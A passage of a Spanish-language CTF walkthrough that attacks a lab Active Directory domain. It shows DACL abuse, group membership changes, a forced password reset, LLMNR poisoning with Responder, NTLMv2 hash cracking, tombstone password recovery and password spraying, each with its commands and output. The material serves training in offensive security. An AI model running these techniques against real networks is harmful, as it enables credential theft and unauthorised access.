+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DACL backed up to dacledit-20260427-225913.bak
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DACL modified successfully!
+</span></span></code></pre></div><p>Excelente, funciono.</p>
+<p>Como tal, el <strong>usuario bob</strong> aún no está dentro del grupo <strong>HELPDESK</strong>, pero como ahora tiene el control total, podemos agregarlo con <strong>bloodyAD</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bloodyAD --host <span style="color:#e6db74">&#34;192.168.56.100&#34;</span> -d <span style="color:#e6db74">&#34;PHANTOM.THL&#34;</span> -u <span style="color:#e6db74">&#34;bob&#34;</span> -p <span style="color:#e6db74">&#34;SuperP@ass123&#34;</span> add groupMember <span style="color:#e6db74">&#34;HELPDESK&#34;</span> <span style="color:#e6db74">&#34;bob&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> bob added to HELPDESK
+</span></span></code></pre></div><p>Muy bien, ahora <strong>bob</strong> también pertenece al grupo <strong>HELPDESK</strong>.</p>
+<h4 id="ForcePassword">Abusando del Permiso ForceChangePassword para Cambiar la Contraseña del Usuario frank y Ganando Acceso a la Máquina Víctima</h4>
+<p>Primero entendamos, ¿qué hace el permiso <code>ForceChangePassword</code>?</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Permiso ForceChangePassword</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>El permiso ForceChangePassword en Active Directory (AD), también conocido como “Reset Password”, es un derecho de control de acceso que permite a un principal de seguridad (usuario, grupo o equipo) restablecer la contraseña de otra cuenta sin necesidad de conocer la contraseña actual.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Ahora entendamos qué podemos hacer con este permiso:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Abuso de Permiso ForceChangePassword</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Este permiso resulta especialmente peligroso para las cuentas con privilegios, ya que permite el movimiento lateral y el acceso no autorizado a otros sistemas mediante la suplantación de identidad de la cuenta comprometida.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Aquí te dejo un blog que explica como abusar de este servicio:</p>
+<ul>
+<li><a href="https://www.hackingarticles.in/forcechangepassword-active-directory-abuse/" taget="_blank">Hacking Articles - Abusing AD-DACL: ForceChangePassword</a></li>
+</ul>
+<p>Utilizaremos la herramienta <strong>net</strong> para cambiar la contraseña del <strong>usuario frank</strong> usando al <strong>usuario bob</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>net rpc password frank <span style="color:#e6db74">&#39;JakiadoJeje123&#39;</span> -U PHANTOM.THL/bob%<span style="color:#e6db74">&#39;SuperP@ass123&#39;</span> -S 192.168.56.100
+</span></span></code></pre></div><p>Comprobemos si funcionó el cambio con <strong>netexec</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 192.168.56.100 -u <span style="color:#e6db74">&#39;frank&#39;</span> -p <span style="color:#e6db74">&#39;JakiadoJeje123&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:PHANTOM.THL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PHANTOM.THL<span style="color:#ae81ff">\f</span>rank:JakiadoJeje123
+</span></span></code></pre></div><p>Funciono.</p>
+<p>Y comprobemos si funciona con <strong>WinRM</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc winrm 192.168.56.100 -u <span style="color:#e6db74">&#39;frank&#39;</span> -p <span style="color:#e6db74">&#39;JakiadoJeje123&#39;</span>
+</span></span><span style="display:flex;"><span>WINRM       192.168.56.100  <span style="color:#ae81ff">5985</span>   DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:PHANTOM.THL<span style="color:#f92672">)</span> 
+</span></span><span style="display:flex;"><span>WINRM       192.168.56.100  <span style="color:#ae81ff">5985</span>   DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PHANTOM.THL<span style="color:#ae81ff">\f</span>rank:JakiadoJeje123 <span style="color:#f92672">(</span>Pwn3d!<span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Perfecto, tenemos acceso a la máquina víctima vía <strong>WinRM</strong>, pero esto es por el permiso <code>CanPSRemote</code>:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Permiso CanPSRemote</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Este permiso indica que un principal de seguridad (usuario, grupo o equipo) puede establecer una sesión remota de PowerShell (PowerShell Remoting) sobre un sistema objetivo. En términos prácticos, CanPSRemote implica que el usuario tiene los privilegios necesarios para autenticarse y ejecutar comandos de manera remota mediante tecnologías como WinRM (Windows Remote Management) y PowerShell Remoting, generalmente a través de herramientas como Enter-PSSession o Invoke-Command.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Usemos <strong>Evil-WinRM</strong> para entrar a la máquina víctima:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>evil-winrm -i 192.168.56.100 -u &#39;frank&#39; -p &#39;JakiadoJeje123&#39;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\frank\Documents&gt;
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\frank\Documents&gt; whoami
+</span></span><span style="display:flex;"><span>phantom\frank
+</span></span></code></pre></div><p>Estamos dentro; sin embargo, no encontraremos la flag del usuario por aquí.</p>
+<h3 id="Responder">Aplicando LLMNR Poisoning con Responder para Capturar Hash NTLMv2</h3>
+<p>Regresando al <strong>servicio SMB</strong>, resulta ser bastante extraño que no tenga ningún archivo y que tengamos permiso de escritura y lectura.</p>
+<p>Antes había mencionado que quizá había algún script que ejecute los archivos/script que se carguen al recurso <strong>Dev Tools</strong>, pero al subir una <strong>Reverse Shell</strong> de <strong>Powershell</strong> y después de esperar un rato, no pasó nada.</p>
+<p>Sin embargo, aún pienso que hay algo que debe de estar por ahí ejecutándose, así que vamos a analizar el tráfico del <strong>servicio SMB</strong> con la herramienta <strong>Responder</strong> y veremos si es posible aplicar un <strong>LLMNR Poisoning</strong>.</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>LLMNR Poisoning</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>El LLMNR Poisoning es un ataque de red en el que un atacante responde a las consultas de resolución de nombres de multidifusión de ámbito local (LLMNR) con respuestas falsificadas, engañando a las víctimas para que se conecten a un host malicioso y revelen sus credenciales de autenticación (normalmente, hash NTLM).</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Aquí te dejo un blog que explica cómo es que se aplica el <strong>LLMNR Poisoning</strong>:</p>
+<ul>
+<li><a href="https://evoila.com/blog/llmnr-poisoning/" target="_blank">LLMNR Poisoning</a></li>
+</ul>
+<p>Iniciemos el <strong>Responder</strong> y esperemos un poco.</p>
+<p>Observa el resultado que obtenemos:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>responder -I eth0
+</span></span><span style="display:flex;"><span>                                         __
+</span></span><span style="display:flex;"><span>  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  |   _|  -__|__ --|  _  |  _  |     |  _  <span style="color:#f92672">||</span>  -__|   _|
+</span></span><span style="display:flex;"><span>  |__| |_____|_____|   __|_____|__|__|_____<span style="color:#f92672">||</span>_____|__|
+</span></span><span style="display:flex;"><span>                   |__|
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Listening <span style="color:#66d9ef">for</span> events...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>NBT-NS<span style="color:#f92672">]</span> Poisoned answer sent to 192.168.56.100 <span style="color:#66d9ef">for</span> name PHANTOM <span style="color:#f92672">(</span>service: File Server<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>LLMNR<span style="color:#f92672">]</span>  Poisoned answer sent to XX <span style="color:#66d9ef">for</span> name PHANTOM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>MDNS<span style="color:#f92672">]</span> Poisoned answer sent to 192.168.56.100  <span style="color:#66d9ef">for</span> name PHANTOM.LOCAL
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>LLMNR<span style="color:#f92672">]</span>  Poisoned answer sent to 192.168.56.100 <span style="color:#66d9ef">for</span> name PHANTOM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>MDNS<span style="color:#f92672">]</span> Poisoned answer sent to XX <span style="color:#66d9ef">for</span> name PHANTOM.LOCAL
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>MDNS<span style="color:#f92672">]</span> Poisoned answer sent to 192.168.56.100  <span style="color:#66d9ef">for</span> name PHANTOM.LOCAL
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>MDNS<span style="color:#f92672">]</span> Poisoned answer sent to XX <span style="color:#66d9ef">for</span> name PHANTOM.LOCAL
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>LLMNR<span style="color:#f92672">]</span>  Poisoned answer sent to XX <span style="color:#66d9ef">for</span> name PHANTOM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>LLMNR<span style="color:#f92672">]</span>  Poisoned answer sent to 192.168.56.100 <span style="color:#66d9ef">for</span> name PHANTOM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>MDNS<span style="color:#f92672">]</span> Poisoned answer sent to XX <span style="color:#66d9ef">for</span> name PHANTOM.LOCAL
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>MDNS<span style="color:#f92672">]</span> Poisoned answer sent to 192.168.56.100  <span style="color:#66d9ef">for</span> name PHANTOM.LOCAL
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>LLMNR<span style="color:#f92672">]</span>  Poisoned answer sent to XX <span style="color:#66d9ef">for</span> name PHANTOM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>MDNS<span style="color:#f92672">]</span> Poisoned answer sent to 192.168.56.100  <span style="color:#66d9ef">for</span> name PHANTOM.LOCAL
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>MDNS<span style="color:#f92672">]</span> Poisoned answer sent to XX <span style="color:#66d9ef">for</span> name PHANTOM.LOCAL
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>LLMNR<span style="color:#f92672">]</span>  Poisoned answer sent to 192.168.56.100 <span style="color:#66d9ef">for</span> name PHANTOM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>LLMNR<span style="color:#f92672">]</span>  Poisoned answer sent to XX <span style="color:#66d9ef">for</span> name PHANTOM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>LLMNR<span style="color:#f92672">]</span>  Poisoned answer sent to 192.168.56.100 <span style="color:#66d9ef">for</span> name PHANTOM
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Client   : XX
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Username : PHANTOM.LOCAL<span style="color:#ae81ff">\r</span>obert
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Hash     : robert::PHANTOM.LOCAL.....
+</span></span></code></pre></div><p>Hemos capturado un hash <strong>NTLMv2</strong> del <strong>usuario robert</strong>.</p>
+<p>Además, el <strong>Responder</strong> parece mencionar un dominio erróneo, pues el dominio correcto es <strong>PHANTOM.THL</strong> y no <strong>PHANTOM.LOCAL</strong>.</p>
+<p>Guarda ese hash en un archivo de texto y usaremos la herramienta <strong>JohnTheRipper</strong> para crackearlo:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>john -w:/usr/share/wordlists/rockyou.txt robertHash
+</span></span><span style="display:flex;"><span>Using default input encoding: UTF-8
+</span></span><span style="display:flex;"><span>Loaded <span style="color:#ae81ff">1</span> password hash <span style="color:#f92672">(</span>netntlmv2, NTLMv2 C/R <span style="color:#f92672">[</span>MD4 HMAC-MD5 32/64<span style="color:#f92672">])</span>
+</span></span><span style="display:flex;"><span>Will run <span style="color:#ae81ff">6</span> OpenMP threads
+</span></span><span style="display:flex;"><span>Press <span style="color:#e6db74">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span style="color:#66d9ef">for</span> status
+</span></span><span style="display:flex;"><span>**********         <span style="color:#f92672">(</span>robert<span style="color:#f92672">)</span>     
+</span></span><span style="display:flex;"><span>1g 0:00:00:03 DONE <span style="color:#f92672">(</span>2026-04-29 00:28<span style="color:#f92672">)</span> 0.2564g/s 2528Kp/s 2528Kc/s 2528KC/s ba2se8..b82508
+</span></span><span style="display:flex;"><span>Use the <span style="color:#e6db74">&#34;--show --format=netntlmv2&#34;</span> options to display all of the cracked passwords reliably
+</span></span><span style="display:flex;"><span>Session completed.
+</span></span></code></pre></div><p>Genial, tenemos su contraseña.</p>
+<p>Comprobemos que funcione con <strong>netexec</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 192.168.56.100 -u <span style="color:#e6db74">&#39;robert&#39;</span> -p <span style="color:#e6db74">&#39;**********&#39;</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> x64 <span style="color:#f92672">(</span>name:DC01<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:PHANTOM.THL<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Null Auth:True<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>SMB         192.168.56.100  <span style="color:#ae81ff">445</span>    DC01             <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> PHANTOM.THL<span style="color:#ae81ff">\r</span>obert:**********
+</span></span></code></pre></div><p>Funciona y, si recordamos, este usuario se puede conectar a la máquina víctima vía <strong>WinRM</strong>.</p>
+<p>Conectémonos usando <strong>Evil-WinRM</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>evil-winrm -i 192.168.56.100 -u &#39;robert&#39; -p &#39;**********&#39;
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Evil-WinRM shell v3.9
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+</span></span><span style="display:flex;"><span>                                        
+</span></span><span style="display:flex;"><span>Info: Establishing connection to remote endpoint
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\robert\Documents&gt;
+</span></span></code></pre></div><p>Estamos dentro y, curiosamente, aquí encontraremos el culpable que permitió el <strong>LLMNR Poisoning</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\robert\Documents&gt; cat connect.ps1
+</span></span><span style="display:flex;"><span>$username = <span style="color:#e6db74">&#34;PHANTOM.LOCAL\robert&#34;</span>
+</span></span><span style="display:flex;"><span>$password = <span style="color:#e6db74">&#34;**********&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>while ($true) {
+</span></span><span style="display:flex;"><span>	New-SmbMapping -RemotePath <span style="color:#e6db74">&#34;\\PHANTOM.LOCAL\Dev Tools&#34;</span> -Username $username -Password $password
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	Start-Sleep -Seconds 60
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>También encontraremos un archivo de texto, pero ese lo analizaremos más adelante.</p>
+<p>En el escritorio, encontrarás la flag del usuario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\robert\Documents&gt; cd ../Desktop
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\robert\Desktop&gt; cat user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h2 id="Post">Post Explotación</h2>
+<h3 id="Tombstone">Analizando la Tombstone del AD y Aplicando Password Spraying</h3>
+<p>Analicemos el mensaje que encontramos en la sesión del <strong>usuario robert</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\robert\Documents&gt; cat migration_notes.txt
+</span></span><span style="display:flex;"><span>[OK] Verify application connectivity after the ERP migration
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Validate that legacy authentication is still working for internal tools
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Review Active Directory group memberships (DevOps / Support)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[OK] Confirm that backup jobs are running correctly
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Check access permissions on shared resources
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[IMPORTANT] Remember to clean up temporary test accounts created during the migration
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Remove unused scripts and obsolete configurations
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[OK] Verify expiration and renewal of internal certificates
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Document performed steps and lessons learned from the migration
+</span></span></code></pre></div><p>Parece ser una lista de cosas por hacer después de una migración, pero podemos leer que un hay tema importante, siendo que se deben eliminar las cuentas temporales que fueron creadas durante la migración.</p>
+<p>Es posible revisar los elementos eliminados del AD, consultando la <strong>Tombstone</strong>:</p>
+<table>
+	<thead>
+			<tr>
+					<th style="text-align: center"><strong>Tombstone AD</strong></th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td style="text-align: center"><em>Una tombstone en Active Directory es la representación de un objeto que ha sido eliminado, pero que aún se conserva temporalmente en el directorio antes de borrarse definitivamente.</em></td>
+			</tr>
+	</tbody>
+</table>
+<p>Te recomiendo revisar estos blogs que mencionan cómo revisar la <strong>Tombstone</strong> desde <strong>PowerShell</strong>:</p>
+<ul>
+<li><a href="https://activedirectorypro.com/how-to-check-tombstone-lifetime-of-active-directory/" target="_blank">How to Check Tombstone Lifetime of Active Directory</a></li>
+<li><a href="https://admindroid.com/how-to-get-deleted-users-in-active-directory" target="_blank">How to Detect Deleted Users in Active Directory</a></li>
+</ul>
+<p>Lo primero que debemos hacer es revisar en cuánto tiempo se vacía la <strong>Tombstone</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\robert\Documents&gt; Get-ADObject <span style="color:#e6db74">&#34;CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=PHANTOM,DC=THL&#34;</span> -Properties tombstoneLifetime
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>DistinguishedName : CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=PHANTOM,DC=THL
+</span></span><span style="display:flex;"><span>Name              : Directory Service
+</span></span><span style="display:flex;"><span>ObjectClass       : nTDSService
+</span></span><span style="display:flex;"><span>ObjectGUID        : 721a02a6-54bc-44dc-9fd9-965b169f1341
+</span></span><span style="display:flex;"><span>tombstoneLifetime : 2147483647
+</span></span></code></pre></div><p>Pues se va a vaciar en 5.8 millones de años.</p>
+<p>Podemos revisar las cuentas eliminadas con el siguiente comando de <strong>PowerShell</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\robert\Documents&gt; Get-ADObject -IncludeDeletedObjects -Filter &#39;IsDeleted -eq $true -and ObjectClass -eq <span style="color:#e6db74">&#34;user&#34;</span>&#39;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Deleted           : True
+</span></span><span style="display:flex;"><span>DistinguishedName : CN=dev_test\0ADEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855,CN=Deleted Objects,DC=PHANTOM,DC=THL
+</span></span><span style="display:flex;"><span>Name              : dev_test
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">DEL</span>:55a7bc61-fdc9-4ecc-bec5-25703d9ee855
+</span></span><span style="display:flex;"><span>ObjectClass       : user
+</span></span><span style="display:flex;"><span>ObjectGUID        : 55a7bc61-fdc9-4ecc-bec5-25703d9ee855
+</span></span></code></pre></div><p>También podemos ver todos los objetos eliminados de la siguiente forma:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-batch" data-lang="batch"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\robert\Documents&gt; Get-ADObject -Filter &#39;isDeleted -eq $true&#39; -IncludeDeletedObjects -SearchBase <span style="color:#e6db74">&#34;CN=Deleted Objects,DC=PHANTOM,DC=THL&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Deleted           : True
+</span></span><span style="display:flex;"><span>DistinguishedName : CN=Deleted Objects,DC=PHANTOM,DC=THL
+</span></span><span style="display:flex;"><span>Name              : Deleted Objects
+</span></span><span style="display:flex;"><span>ObjectClass       : container
+</span></span><span style="display:flex;"><span>ObjectGUID        : 63e0d32e-2125-40ad-8405-c87b353e09b9
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Deleted           : True
+</span></span><span style="display:flex;"><span>DistinguishedName : CN=dev_test\0ADEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855,CN=Deleted Objects,DC=PHANTOM,DC=THL
+</span></span><span style="display:flex;"><span>Name              : dev_test
+</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">DEL</span>:55a7bc61-fdc9-4ecc-bec5-25703d9ee855
+</span></span><span style="display:flex;"><span>ObjectClass       : user
+</span></span><span style="display:flex;"><span>ObjectGUID        : 55a7bc61-fdc9-4ecc-bec5-25703d9ee855
+</span></span></code></pre></div><p>En ambos casos, podemos ver que existió un usuario llamado <strong>dev_test</strong>.</p>
+<p>Podemos utilizar el <strong>GUID</strong> de ese usuario para ver sus propiedades como objeto, siendo que encontraremos algo interesante:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>*Evil-WinRM* PS C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\r</span>obert<span style="color:#ae81ff">\D</span>ocuments&gt; Get-ADObject -IncludeDeletedObjects -Identity <span style="color:#e6db74">&#34;55a7bc61-fdc9-4ecc-bec5-25703d9ee855&#34;</span> -Properties *
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Deleted                         : True
+</span></span><span style="display:flex;"><span>Description                     : **********
+</span></span><span style="display:flex;"><span>DisplayName                     : dev_test
+</span></span><span style="display:flex;"><span>DistinguishedName               : CN<span style="color:#f92672">=</span>dev_test<span style="color:#ae81ff">\0</span>ADEL:55a7bc61-fdc9-4ecc-bec5-25703d9ee855,CN<span style="color:#f92672">=</span>Deleted Objects,DC<span style="color:#f92672">=</span>PHANTOM,DC<span style="color:#f92672">=</span>THL
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>La descripción del usuario parece ser una contraseña, pero no sabemos a qué usuario puede pertenecer.</p>
+<p>Apliquemos <strong>Password Spraying</strong> con <strong>netexec</strong> para identificar si un usuario tiene esta contraseña:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 192.168.56.100 -u usuarios.txt -p <span style="color:#e6db74">&#39;**********&#39;</span> --no-bruteforce --continue-on-success
